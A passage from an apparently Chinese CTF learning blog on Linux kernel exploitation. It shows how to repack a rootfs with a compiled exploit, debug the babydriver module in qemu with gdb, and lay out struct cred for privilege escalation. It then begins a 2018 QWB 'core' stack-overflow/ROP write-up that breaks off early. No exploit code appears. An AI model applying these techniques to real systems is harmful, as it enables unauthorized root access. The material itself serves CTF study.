&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;mkdir&lt;/span&gt; File_system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cp&lt;/span&gt; rootfs.cpio ./File_system/rootfs.cpio.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; File_system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gunzip rootfs.cpio.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cpio -idmv &amp;lt; rootfs.cpio&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面是对文件系统的解包处理，下面的 pack.sh 会将我们写好的 exp 写入，后面启动的时候，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1wYWNrLTk1NWZtYnkzMGU2bzNhaDVhLnhuLS1zaGJvb3QtNGwyam1uLnNo&#34;&gt;我们可以把 pack.sh 写入 boot.sh&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pack.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; File_system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc exploit.c -static -o exp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find . | cpio -o --format=newc &amp;gt; ../rootfs.cpio&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ../&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;调试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调试&#34;&gt;#&lt;/a&gt; 调试&lt;/h2&gt;
&lt;p&gt;我们再启动的脚本里面，对 quem_system_x86_64 启用了人 - s，也就是说我们打开了一个默认的端口。我们也可以指定端口。&lt;/p&gt;
&lt;p&gt;提取 vmlinux，需要使用 extract-vmlinux 脚本提取出带符号的源码&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./extract-vmlinux ./bzImage &amp;gt; vmlinux&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;启动 gdb&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gdb ./vmlinux -q&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;导入符号表,这里需要查看模块加载在内存中的真实地址，用boot.sh脚本运行之后输入命令lsmod即可&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/ $ lsmod&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;babydriver 16384 0 - Live 0xffffffffc0000000 (OE)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后在 gdb 中输入&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;add-symbol-file **/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​	两个参数分别为 babydriver.ko 在解包后的文件系统中的路径以及.text 段的地址。地址可以直接在 qemu 中查看：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/20190909200711518.png&#34; alt=&#34;在这里插入图片描述&#34;&gt;&lt;/p&gt;
&lt;p&gt;添加远程执行参数，在 boot.sh 的 qemu 参数中添加&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-gdb tcp::7777&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;gdb 连接程序，在 gdb 中执行命令&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;target remote &lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;7777&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;相关的结构体&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#相关的结构体&#34;&gt;#&lt;/a&gt; 相关的结构体&lt;/h2&gt;
&lt;h3 id=&#34;cred&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cred&#34;&gt;#&lt;/a&gt; cred&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;cred&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;atomic_t&lt;/span&gt;	usage;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; CONFIG_DEBUG_CREDENTIALS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;atomic_t&lt;/span&gt;	subscribers;	&lt;span class=&#34;comment&#34;&gt;/* number of processes subscribed */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;		*put_addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt;	magic;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; CRED_MAGIC	0x43736564&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; CRED_MAGIC_DEAD	0x44656144&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kuid_t&lt;/span&gt;		uid;		&lt;span class=&#34;comment&#34;&gt;/* real UID of the task */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kgid_t&lt;/span&gt;		gid;		&lt;span class=&#34;comment&#34;&gt;/* real GID of the task */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kuid_t&lt;/span&gt;		suid;		&lt;span class=&#34;comment&#34;&gt;/* saved UID of the task */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kgid_t&lt;/span&gt;		sgid;		&lt;span class=&#34;comment&#34;&gt;/* saved GID of the task */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kuid_t&lt;/span&gt;		euid;		&lt;span class=&#34;comment&#34;&gt;/* effective UID of the task */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kgid_t&lt;/span&gt;		egid;		&lt;span class=&#34;comment&#34;&gt;/* effective GID of the task */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kuid_t&lt;/span&gt;		fsuid;		&lt;span class=&#34;comment&#34;&gt;/* UID for VFS ops */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kgid_t&lt;/span&gt;		fsgid;		&lt;span class=&#34;comment&#34;&gt;/* GID for VFS ops */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt;	securebits;	&lt;span class=&#34;comment&#34;&gt;/* SUID-less security management */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kernel_cap_t&lt;/span&gt;	cap_inheritable; &lt;span class=&#34;comment&#34;&gt;/* caps our children can inherit */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kernel_cap_t&lt;/span&gt;	cap_permitted;	&lt;span class=&#34;comment&#34;&gt;/* caps we&amp;#x27;re permitted */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kernel_cap_t&lt;/span&gt;	cap_effective;	&lt;span class=&#34;comment&#34;&gt;/* caps we can actually use */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kernel_cap_t&lt;/span&gt;	cap_bset;	&lt;span class=&#34;comment&#34;&gt;/* capability bounding set */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;kernel_cap_t&lt;/span&gt;	cap_ambient;	&lt;span class=&#34;comment&#34;&gt;/* Ambient capability set */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; CONFIG_KEYS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;	jit_keyring;	&lt;span class=&#34;comment&#34;&gt;/* default keyring to attach requested&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;					 * keys to */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;key&lt;/span&gt; __&lt;span class=&#34;title&#34;&gt;rcu&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;session_keyring&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* keyring inherited over fork */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;key&lt;/span&gt;	*&lt;span class=&#34;title&#34;&gt;process_keyring&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* keyring private to this process */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;key&lt;/span&gt;	*&lt;span class=&#34;title&#34;&gt;thread_keyring&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* keyring private to this thread */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;key&lt;/span&gt;	*&lt;span class=&#34;title&#34;&gt;request_key_auth&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* assumed request_key authority */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; CONFIG_SECURITY&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;		*security;	&lt;span class=&#34;comment&#34;&gt;/* subjective LSM security */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;user_struct&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;user&lt;/span&gt;;&lt;/span&gt;	&lt;span class=&#34;comment&#34;&gt;/* real user ID subscription */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;user_namespace&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;user_ns&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* user_ns the caps and keyrings are relative to. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;group_info&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;group_info&lt;/span&gt;;&lt;/span&gt;	&lt;span class=&#34;comment&#34;&gt;/* supplementary groups for euid/fsgid */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;rcu_head&lt;/span&gt;	&lt;span class=&#34;title&#34;&gt;rcu&lt;/span&gt;;&lt;/span&gt;		&lt;span class=&#34;comment&#34;&gt;/* RCU deletion hook */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//总大小0xa8，一直到gid结束是28个字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM4MTAwNTY5L2FydGljbGUvZGV0YWlscy8xMDA2NzMxMDM=&#34;&gt;https://blog.csdn.net/m0_38100569/article/details/100673103&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuejFyMC50b3AvMjAyMS8xMC8yOS9rZXJuZWwtcHduJUVGJUJDJTg4JUU0JUJBJThDJUVGJUJDJTg5JUU1JTlGJUJBJUU3JUExJTgwJUU3JTlGJUE1JUU4JUFGJTg2LyMlRTUlQUUlOUUlRTYlODglOTg=&#34;&gt;https://www.z1r0.top/2021/10/29/kernel-pwn（二）基础知识 /# 实战&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;参考博客&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#参考博客&#34;&gt;#&lt;/a&gt; 参考博客&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuejFyMC50b3Av&#34;&gt;https://www.z1r0.top/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcnR0bmJhMy5jbi8=&#34;&gt;https://arttnba3.cn/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yYXktY3AuZ2l0aHViLmlvL2NhdGVnb3J5Lw==&#34;&gt;https://ray-cp.github.io/category/&lt;/span&gt;			//ray 大佬写的很多知识的总结，很详尽&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/</guid>
            <title>强网杯2018_core</title>
            <link>http://example.com/2022/05/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2018-core/</link>
            <category>learning</category>
            <pubDate>Sun, 01 May 2022 18:14:39 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;2018强网杯core作为kernel学习开始的记录栈溢出ret2rop&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2018强网杯core作为kernel学习开始的记录栈溢出ret2rop&#34;&gt;#&lt;/a&gt; 2018 强网杯 core，作为 kernel 学习开始的记录，栈溢出，ret2rop&lt;/h1&gt;
&lt;h2 id=&#34;前置zhishi&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前置zhishi&#34;&gt;#&lt;/a&gt; 前置 zhishi&lt;/h2&gt;
&lt;h2 id=&#34;1题目环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1题目环境&#34;&gt;#&lt;/a&gt; 1. 题目环境&lt;/h2&gt;
&lt;p&gt;题目保护环境有两类，一类可执行文件的保护机制，一类是文件系统驱动内核的保护机制&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/kernel/&lt;span class=&#34;number&#34;&gt;2018&lt;/span&gt;qwb_core/give_to_player$ checksec core.ko&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/dreamcat/Desktop/kernel/2018qwb_core/give_to_player/core.ko&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    No RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No &lt;span class=&#34;title function_&#34;&gt;PIE&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; start.sh:       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    qemu-system-x86_64 \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-m 128M \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-kernel ./bzImage \&lt;/span&gt;&lt;br&gt;&lt;span 